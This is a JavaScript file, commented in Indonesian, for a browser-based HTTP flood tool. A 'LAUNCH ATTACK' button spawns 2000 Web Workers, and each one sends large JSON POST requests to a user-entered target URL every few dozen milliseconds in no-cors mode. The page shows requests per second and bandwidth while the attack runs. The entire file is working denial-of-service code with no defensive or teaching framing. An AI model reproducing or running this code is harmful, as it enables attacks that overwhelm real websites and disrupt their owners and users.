const MAX_WORKERS = 2000;  // Jumlah maksimal workers
let workers = [];
let attackActive = false;
let totalRequests = 0;
let startTime = 0;

// Hitung statistik setiap detik
setInterval(() => {
    if(!attackActive) return;
    
    const elapsed = (Date.now() - startTime) / 1000;
    const rps = Math.round(totalRequests / elapsed);
    const bandwidth = (rps * 0.1).toFixed(1); // Estimasi 0.1MB/request
    
    document.getElementById('rps').textContent = rps;
    document.getElementById('bandwidth').textContent = bandwidth + ' MB/s';
    document.getElementById('workerCount').textContent = workers.length;
}, 1000);

document.getElementById('attackBtn').addEventListener('click', async () => {
    const TARGET = document.getElementById('targetUrl').value;
    if(!TARGET) return alert("Masukkan URL target!");
    
    attackActive = !attackActive;
    const btn = document.getElementById('attackBtn');
    
    if(attackActive) {
        btn.textContent = "☠️ STOP ATTACK";
        btn.style.background = "#000";
        btn.style.color = "#ff0000";
        startTime = Date.now();
        totalRequests = 0;
        
        // Mulai 2000 workers
        for(let i = 0; i < MAX_WORKERS; i++) {
            const worker = new Worker(URL.createObjectURL(new Blob([`
                let reqCount = 0;
                const PAYLOAD = new Array(50000).fill(0);
                
                async function attack() {
                    try {
                        await fetch('${TARGET}', {
                            method: 'POST',
                            mode: 'no-cors',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(PAYLOAD)
                        });
                        reqCount++;
                        postMessage(reqCount);
                    } catch(e) {}
                }
                
                setInterval(attack, ${Math.floor(Math.random() * 50) + 25});
            `])));
            
            worker.onmessage = (e) => totalRequests++;
            workers.push(worker);
        }
        
    } else {
        // Hentikan semua workers
        workers.forEach(w => w.terminate());
        workers = [];
        btn.textContent = "🚀 LAUNCH ATTACK";
        btn.style.background = "#ff0000";
        btn.style.color = "#000";
    }
});